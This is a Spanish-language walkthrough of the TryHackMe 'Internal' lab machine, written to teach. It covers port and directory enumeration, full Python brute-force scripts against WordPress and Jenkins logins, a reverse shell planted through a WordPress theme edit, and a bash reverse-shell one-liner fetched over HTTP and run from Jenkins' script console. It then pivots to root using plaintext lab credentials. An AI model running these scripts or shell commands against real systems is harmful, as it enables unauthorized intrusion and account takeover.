<head>
  <meta property="og:title" content="Internal">
  <meta property="og:description" content="Write up De la maquina internal de dificultad dificil de la plataforma de TryHackMe.">
  <meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg">
</head>

Write up De la maquina internal de dificultad dificil de la plataforma de TryHackMe.

![](/assets/img/internal/avatar.png)

## Enumeracion
Empezemos enumerando que puertos estan abiertos en la maquina victima.
```bash
❯ nmap internal.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 16:22 -05
Nmap scan report for internal.thm (10.10.132.175)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.70 seconds
```
Detectemos que version corre en estos puertos.
```bash
> nmap -sCV -p22,80 -oN targeted internal.thm
Nmap scan report for internal.thm (10.10.112.205)
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 19 17:58:04 2023 -- 1 IP address (1 host up) scanned in 14.01 seconds
```
Enumeremos el servidor web que corre en el puerto 80.
![](/assets/img/internal/web.png)
Vemos una pagina predeterminada de apache, apliquemos fuzzing para encontrar mas rutas en esta web.
```bash
❯ gobuster dir -t 200 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://internal.thm/ --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/20 16:29:51 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]                                      
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/] 
                                                                                     
===============================================================
2023/04/20 16:30:34 Finished
===============================================================
```
En el directorio /blog hay un wordpress Desplegado.
![](/assets/img/internal/word.png)

Y vemos una sola publicacion, si vemos esta publicacion nos muestra el usuario que la creo que en este caso es admin.
![](/assets/img/internal/admin.png)

Podemos comprobar que el usuario admin es un usuario valido comprobandolo en el panel de inicio de session.
![](/assets/img/internal/log.png)
Vamos aplicar Fuerza bruta contra el panel de inicio de session, voy crear un script de python atraves del cual aplicar la fuerza bruta.
```python
import threading, pdb
import requests
import sys
from pwn import *

# Variables globales
url_login = 'http://internal.thm/blog/wp-login.php'
Burp = {'http':'http://127.0.0.1:8080'}
found_pass = False
l1 = log.progress("Password")
l2 = log.progress("Counter")

def makeBruteForce(password):
    
    global found_pass

    post_data = {
            "log":"admin",
            "pwd":password,
            "wp-submit":"Log In",
            "redirect_to":"http://internal.thm/blog/wp-admin/",
            "testcookie":"1"
    }
    
    cookies = {
            "wp-settings-time-1":"1681947286; wordpress_test_cookie=WP+Cookie+check"
            }
    
    r = requests.post(url_login, data=post_data, cookies=cookies, allow_redirects=False)
    
    if r.status_code == 302:
        l1.success("password found %s " % password)
        found_pass = True
    
    return

def makeRequest():

    f = open('/usr/share/wordlists/rockyou.txt', 'rb')
    length = 14344393
    count = 0
    threads = []

    for password in f.readlines():

        if found_pass:
            break

        password = password.decode().replace("\n", "")
        l1.status("Probando Con la contraseña %s" % password)
        l2.status("Contraseñas Probadas [{}/{}]".format(count, length))
        count += 1
        
        thread = threading.Thread(target=makeBruteForce, args=(password, ))
        threads.append(thread)

        if count % 150 == 0 or count == length:
            for thread in threads:
                try:
                    thread.start()
                except KeyboardInterrupt:
                    print("\n[!] Termimando con los hilos")
                    sys.exit(1)
                
            for thread in threads:
                try:
                    thread.join()
                except KeyboardInterrupt:
                    print("\n[!] Termimando los hilos")
                    sys.exit(1)
                
            threads = []

    for thread in threads:
        thread.join()

if __name__ == "__main__":
        makeRequest()

```
Lo ejecutamos y obtenemos la contraseña del usuario admin.
```bash
❯ python3 wordPress_BruteForce.py
[+] Password: password found my2boys 
[┤] Counter: Contraseñas Probadas [3899/14344393]
```
Autentiquemosnos con esta contraseña
![](/assets/img/internal/auth.png)
La contraseña es correcta, Obtenemos accesso al panel administrativo.
![](/assets/img/internal/pres.png)
## Intrusion
Estando dentro de un wordpress como administradores, tenemos vias para ejecutar comandos, vallamos a appearance y Theme Editor, y vamos a modificar el archivo 404.php para que nos envie una revershell.
![](/assets/img/internal/shell.png)
Actualizamos el archivo y ahora para generar un error y que nos cargue este archivo que acabamos de modificar simplemente tenemos que buscar algo que no exista en el servidor.
```bash
❯ curl -s "http://internal.thm/blog/?p=13231231"
```
Por debajo obtenemos la shell.
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.132.175] 58960
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/var/www/html/wordpress$ whoami
whoami
www-data
www-data@internal:/var/www/html/wordpress$ 
```
## Movimiento lateral
Si listamos los archivos del directorio opt, vemos un archivo un poco extraño.
```bash
www-data@internal:/$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
```
Si vemos su contenido nos dan la contraseña en texto claro del usuario aubreanna.
```bash
www-data@internal:/$ cat /opt/wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
Conectemosnos por ssh con estas credenciales.
```bash
❯ sshpass -p 'bubb13guM!@#123' ssh aubreanna@internal.thm
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 20 22:24:31 UTC 2023

  System load:  0.0               Processes:              110
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 35%               IP address for eth0:    10.10.76.45
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Thu Apr 20 22:24:17 2023 from 10.8.47.45
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
aubreanna@internal:~$ 
```
En el directorio personal de este usuario hay una nota de jenkis.
```bash
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
```
Si vemos su contenido nos dice que hay un jenkins corriendo en el puerto 8080.
```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```
Este puerto esta corriendo en un contenedor al cual no tenemos accesso desde nuestra maquina apliquemos un local port forwarding para poder acceder a el desde nuestra maquina.
```bash
❯ sshpass -p 'bubb13guM!@#123' ssh aubreanna@internal.thm -L 8080:127.0.0.1:8080
```
Accedemos al puerto 8080 y vemos el jenkins.
![](/assets/img/internal/jenkis.png)
En este panel tambien vamos a aplicar fuerza bruta, voy a modificar el script que utilize para el wordpress y adaptarlo para el jenkins.

```python
import threading, pdb
import requests
import sys
from pwn import *

# Variables globales
url_login = 'http://127.0.0.1:8080/j_acegi_security_check'
found_pass = False
l1 = log.progress("Password")
l2 = log.progress("Counter")

def makeBruteForce(password):
    
    global found_pass

    post_data = {
        "j_username":"admin",
        "j_password":password,
        "from":"/",
        "Submit":"Sign+in"
    }
    
    r = requests.post(url_login, data=post_data)
    
    if r.status_code == 200:
        l1.success("password found %s " % password)
        found_pass = True
    
#    return

def makeRequest():

    f = open('/usr/share/wordlists/rockyou.txt', 'rb')
    length = 14344393
    count = 0
    threads = [] # Creamos la lista de hilos vacía

    for password in f.readlines():

        if found_pass:
            break

        password = password.decode().replace("\n", "")
        l1.status("Probando Con la contraseña %s" % password)
        l2.status("Contraseñas Probadas [{}/{}]".format(count, length))
        count += 1
        
        thread = threading.Thread(target=makeBruteForce, args=(password, ))
        threads.append(thread)

        if count % 60 == 0 or count == length:
            for thread in threads:
                try:
                    thread.start()
                except KeyboardInterrupt:
                    print("\n[!] Termimando hilos")
                           
            for thread in threads:
                try:
                    thread.join()
                except KeyboardInterrupt:
                    print("\n[!] Termimando hilos")
                
            threads = []

    for thread in threads:
        thread.join()

if __name__ == "__main__":
        makeRequest()
```
Lo ejecutamos y obtenemos la contraseña.
```bash
❯ python3 jenkis_BruteForce.py
[+] Password: password found spongebob 
[└] Counter: Contraseñas Probadas [119/14344393]
```
Autentiquemosnos en el panel de inicio de session.
![](/assets/img/internal/wel.png)
Estando Dentro de un jankins podemos, ejecutar comandos en la consola de scripts.
![](/assets/img/internal/rce.png)
Para ganar acceso a la maquina voy a crear un archivo index.html con un script de bash que se encargue de enviarme una revershell.
```bash
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.8.47.45/4444 0>&1"
```
Voy a montar un servidor http con python
```bash
❯ sudo python3 -m http.server 80
```
Ahora voy hacerme un curl a mi servidor y guardar el output en un archivo
![](/assets/img/internal/curl.png)
Me pongo en escucha con nc
```bash
❯ nc -lvnp 4444
```
Y ejecuto el archivo.
![](/assets/img/internal/rev.png)
Se ejecuto correctamente y me envio la shell.
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.76.45] 38520
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$ whoami
whoami
jenkins
jenkins@jenkins:/$ 
```
Si vemos la ip que tenemos, nos damos cuenta que el servicio como vimos en la nota esta corriendo en un contenedor.
```bash
jenkins@jenkins:/$ hostname -I
172.17.0.2 
```
## Escalada de privelegios
Si volvemos a listar el contenido del directorio /opt vemos que han dejado una nota.
```bash
jenkins@jenkins:/$ ls -la /opt/
total 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
```
Si vemos su contenido nos dan la contraseña de root en texto claro.

```bash
jenkins@jenkins:/$ cat /opt/note.txt 
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```
Esta contraseña no es del usuario root del contenedor si no del usuario root de la maquina real.
```bash
❯ sshpass -p 'tr0ub13guM!@#123' ssh root@internal.thm
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 20 23:06:04 UTC 2023

  System load:  0.0               Processes:              116
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 43%               IP address for eth0:    10.10.76.45
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Apr 20 23:05:54 2023 from 10.8.47.45
root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@internal:~# 
```
Gracias por leer.